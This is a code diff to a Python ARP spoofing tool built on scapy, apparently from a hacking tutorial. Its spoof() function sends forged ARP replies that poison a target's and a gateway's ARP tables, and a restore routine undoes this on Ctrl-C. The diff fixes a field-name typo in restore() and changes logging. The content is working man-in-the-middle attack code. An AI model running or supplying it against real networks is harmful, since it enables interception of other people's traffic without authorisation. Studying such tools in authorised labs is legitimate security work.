@@ -1,5 +1,7 @@
 import subprocess
 import optparse
+import sys
+
 import scapy.all as scapy
 import time
 
@@ -17,13 +19,13 @@ def get_mac(ip):
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet, verbose=False)
+    scapy.send(packet)
 
 
 def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
-    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, pscr=source_ip, hwsrc=source_mac)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, count=4, verbose=False)
 
 
@@ -61,3 +63,4 @@ except KeyboardInterrupt:
     print("\n[-] Detected CTRL C... Reseting ARP tables!")
     restore(target, gateway)
     restore(gateway, target)
+
